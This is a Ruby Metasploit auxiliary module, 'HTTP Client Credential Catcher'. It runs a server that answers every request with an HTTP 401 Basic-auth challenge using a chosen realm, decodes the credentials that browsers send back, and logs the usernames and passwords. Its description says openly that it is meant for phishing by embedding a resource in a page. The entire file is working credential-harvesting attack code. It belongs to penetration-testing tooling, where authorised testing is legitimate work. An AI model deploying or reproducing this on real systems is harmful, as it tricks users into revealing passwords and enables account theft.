require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::TcpServer
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'HTTP Client Credential Catcher',
			'Version'     => '$Revision:  $',
			'Description'    => %q{
				This module responds to all requests for resources with a HTTP 401.  This should
				cause most browsers to prompt for credentials.  If the user enters Basic Auth creds
				they are sent to the console.

				This may be helpful in some phishing expeditions where it is possible to embed a
				resource into a page.

				This attack is discussed in Chapter 3 of The Tangled Web by Michal Zalewski.
			},
			'Author'      => ['saint patrick <saintpatrick@l1pht.com>'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
					[ 'Capture' ]
				],
			'PassiveActions' =>
				[
					'Capture'
				],
			'DefaultAction'  => 'Capture'
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
				OptString.new('REALM',    [ true, "The authentication realm you'd like to present.", "Secure Site" ]),
			], self.class)
	end

	# Not compatible today
	def support_ipv6?
		false
	end

	def run
		@myhost   = datastore['SRVHOST']
		@myport   = datastore['SRVPORT']
		@realm    = datastore['REALM']

		print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
		exploit()
	end

	def on_client_connect(c)
		c.extend(Rex::Proto::Http::ServerClient)
		c.init_cli(self)
	end

	def on_client_data(cli)
		begin
			data = cli.get_once(-1, 5)
			raise ::Errno::ECONNABORTED if !data or data.length == 0
			case cli.request.parse(data)
				when Rex::Proto::Http::Packet::ParseCode::Completed
					dispatch_request(cli, cli.request)
					cli.reset_cli
				when  Rex::Proto::Http::Packet::ParseCode::Error
					close_client(cli)
			end
		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
		rescue ::OpenSSL::SSL::SSLError
		rescue ::Exception
			print_error("Error: #{$!.class} #{$!} #{$!.backtrace}")
		end

		close_client(cli)
	end

	def close_client(cli)
		cli.close
		# Require to clean up the service properly
		raise ::EOFError
	end

	def dispatch_request(cli, req)

		phost = cli.peerhost
		mysrc = Rex::Socket.source_address(cli.peerhost)



		if(req['Authorization'] and req['Authorization'] =~ /basic/i)
			basic,auth = req['Authorization'].split(/\s+/)
			user,pass  = Rex::Text.decode_base64(auth).split(':', 2)

			report_auth_info(
				:host      => cli.peerhost,
				:port => datastore['SRVPORT'],
				:sname     => 'HTTP',
				:user      => user,
				:pass      => pass,
				:source_type => "captured",
				:active    => true
			)

			print_status("HTTP LOGIN #{cli.peerhost} > :#{@myport} #{user} / #{pass} => #{req.resource}")
		else
			data = %Q^
				<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
				"http://www.w3.org/TR/1999/REC-html401-19991224/loose.dtd">
				<HTML>
					<HEAD>
						<TITLE>Error</TITLE>
							<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=ISO-8859-1">
					</HEAD>
						<BODY><H1>401 Unauthorized.</H1></BODY>
				</HTML>
				^

		res  =
			"HTTP/1.1 401 Authorization Required\r\n" +
			"WWW-Authenticate: Basic realm=\"#{@realm}\"\r\n" +
			"Cache-Control: must-revalidate\r\n" +
			"Content-Type: text/html\r\n" +
			"Content-Length: #{data.length}\r\n" +
			"Connection: Close\r\n\r\n#{data}"

		cli.put(res)
		end

		return

	end

end
